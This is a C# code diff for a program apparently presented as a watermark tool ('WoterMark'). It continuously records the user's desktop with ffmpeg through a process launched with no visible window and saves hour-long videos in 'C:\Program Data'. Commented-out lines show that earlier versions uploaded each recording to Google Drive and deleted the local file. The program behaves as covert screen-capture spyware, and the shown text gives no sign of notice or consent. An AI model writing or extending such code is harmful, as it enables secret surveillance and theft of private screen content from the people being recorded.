@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -29,6 +29,8 @@ using Google.Apis.Util.Store;
 using static Google.Apis.Drive.v3.DriveService;
 using Google.Apis.Upload;
 using static System.Formats.Asn1.AsnWriter;
+using Path = System.IO.Path;
+using System.Diagnostics;
 
 namespace WoterMark
 {
@@ -59,23 +61,25 @@ namespace WoterMark
             var executor = new CommandLineExecutor();
             var libsPath = "C:\\Program Data";
             var currentDate = DateTime.Now.ToString("yyyy-MM-dd");
-            var parentId = CreateFolder(currentDate);
+        //    var parentId = CreateFolder(currentDate);
             while (true)
             {
                 try
                 {
-                    if (currentDate != DateTime.Now.ToString("yyyy-MM-dd"))
+                    currentDate = DateTime.Now.ToString("yyyy-MM-dd");
+                    var path = System.IO.Path.Combine(libsPath, currentDate);
+                    if (!Directory.Exists(path))
                     {
-                        currentDate = DateTime.Now.ToString("yyyy-MM-dd");
-                        parentId = CreateFolder(currentDate);
+                        Directory.CreateDirectory(path);
                     }
 
-                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
-                    executor.Execute(true, $"cd {libsPath}", $"ffmpeg.exe -t 3600 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");
+                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
+                    Execute(dt);
+                    System.IO.File.Move(Path.Combine(libsPath, $"{dt}.mp4"), Path.Combine(path, $"{dt}.mp4"));
+                    Task.Delay(10000);
 
-                    UploadFile($"{libsPath}/{dt}.mp4", new string[] {parentId});
-                    System.IO.File.Delete($"{libsPath}/{dt}.mp4");
-                    Thread.Sleep(10000);
+           //         UploadFile($"{libsPath}/{dt}.mp4", new string[] {parentId});
+               //     System.IO.File.Delete($"{libsPath}/{dt}.mp4");
                 }
                 catch (Exception ex)
                 {
@@ -84,6 +88,31 @@ namespace WoterMark
                 }
             }
         }
+
+    private void Execute(string dt)
+    {
+      Process process = new Process();
+      process.StartInfo = new ProcessStartInfo
+      {
+        FileName = "ffmpeg.exe",
+        WorkingDirectory = "C:\\Program Data",
+        Arguments = $"-t 3600 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4",
+
+        RedirectStandardOutput = true,
+        RedirectStandardError = true,
+        RedirectStandardInput = true,
+        UseShellExecute = false,
+        CreateNoWindow = true
+      }; 
+
+      process.Start();
+
+
+      process.StandardInput.WriteLine("exit");
+
+        process.WaitForExit();
+
+    }
 
         protected override void OnSourceInitialized(EventArgs e)
         {
